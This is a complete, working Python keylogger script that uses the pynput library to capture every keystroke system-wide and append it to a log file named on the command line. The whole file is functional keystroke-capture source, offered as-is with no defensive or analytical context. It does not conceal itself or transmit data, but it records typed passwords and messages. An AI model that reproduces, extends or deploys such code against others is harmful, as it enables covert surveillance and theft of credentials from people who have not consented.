import argparse
from pynput import keyboard

class KeyLogger:

    def __init__(self, output: str) -> None:
        self.output = output

    def log(self, data: str) -> None:
        with open(self.output, 'a') as file_to_log:
            file_to_log.write(data)

    def on_press(self, key):
        try: self.log(key.char)
        except AttributeError:
            if key == key.space: self.log(" ")
            elif key == key.enter: self.log("\n")
            else: self.log("?")

    def main(self) -> None:
        try:
            self.log("--------- INIT KEY LOGGER ---------")
            with keyboard.Listener(on_press=self.on_press) as listener:
                listener.join()
            self.log("--------- FIN KEY LOGGER ---------")
        except KeyboardInterrupt as e:
            exit(0)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Keylogger script.")
    parser.add_argument('--output', '-o', help='Log file path')
    output = parser.parse_args().output

    key_logger = KeyLogger(output)
    key_logger.main()